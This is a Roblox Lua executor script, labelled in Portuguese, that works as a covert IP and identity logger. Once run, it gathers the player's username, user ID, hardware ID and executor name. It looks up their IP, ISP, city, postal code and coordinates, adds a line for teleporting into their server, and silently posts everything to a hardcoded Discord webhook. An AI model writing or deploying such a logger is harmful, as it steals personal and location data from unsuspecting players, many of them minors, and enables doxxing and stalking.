local Webhook = "https://discord.com/api/webhooks/1383256597907771504/-VepgB9hxcGOQ6QNH2-sLVnEsuqqg1rsa8nDp8Ufrr8kxojg1LnAr77TzUKmB8-ApcqF"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local Username = LocalPlayer.Name
local DisplayName = LocalPlayer.DisplayName
local UserId = LocalPlayer.UserId
local JobId = game.JobId
local PlaceId = game.PlaceId
local ThumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=420&height=420&format=png"

local function GetExecutor()
    return (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Desconhecido"
end

local function GetHWID()
    return (gethwid and gethwid()) or (syn and syn.gethwid and syn.gethwid()) or "Indisponível"
end

local function GetIPData()
    local Request = (http_request or request or syn and syn.request or fluxus and fluxus.request)
    if not Request then return {ip = "Indisponível"} end

    local success, result = pcall(function()
        return Request({
            Url = "http://ip-api.com/json/",
            Method = "GET"
        })
    end)

    if success and result and result.Body then
        local data = HttpService:JSONDecode(result.Body)
        return data
    else
        return {ip = "Indisponível"}
    end
end

local ipData = GetIPData()

local locationInfo = ""
if ipData.status == "success" then
    locationInfo = string.format(
        "**IP:** %s\n**Provedor:** %s\n**País:** %s\n**Estado:** %s\n**Cidade:** %s\n**Fuso Horário:** %s\n**CEP:** %s\n**Latitude:** %s\n**Longitude:** %s",
        ipData.query or "?", ipData.isp or "?", ipData.country or "?", ipData.regionName or "?",
        ipData.city or "?", ipData.timezone or "?", ipData.zip or "?", tostring(ipData.lat or "?"), tostring(ipData.lon or "?")
    )
else
    locationInfo = "Informações de localização indisponíveis."
end
local teleportScript = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", PlaceId, JobId)

local Data = {
    ["embeds"] = {{
        ["title"] = "**Execução Detectada**",
        ["color"] = tonumber(0x00ffcc),
        ["thumbnail"] = {
            ["url"] = ThumbnailUrl
        },
        ["fields"] = {
            {
                ["name"] = "Usuário",
                ["value"] = Username .. " (" .. DisplayName .. ")",
                ["inline"] = true
            },
            {
                ["name"] = "User ID",
                ["value"] = tostring(UserId),
                ["inline"] = true
            },
            {
                ["name"] = "Executor",
                ["value"] = GetExecutor(),
                ["inline"] = true
            },
            {
                ["name"] = "HWID",
                ["value"] = GetHWID(),
                ["inline"] = false
            },
            {
                ["name"] = "Localização (IP)",
                ["value"] = locationInfo,
                ["inline"] = false
            },
            {
                ["name"] = "Script para entrar no servidor",
                ["value"] = "```lua\n" .. teleportScript .. "\n```",
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "Logger - Logger do garou é dark"
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}
local Request = (http_request or request or syn and syn.request or fluxus and fluxus.request)
if Request then
    pcall(function()
        Request({
            Url = Webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(Data)
        })
    end)
end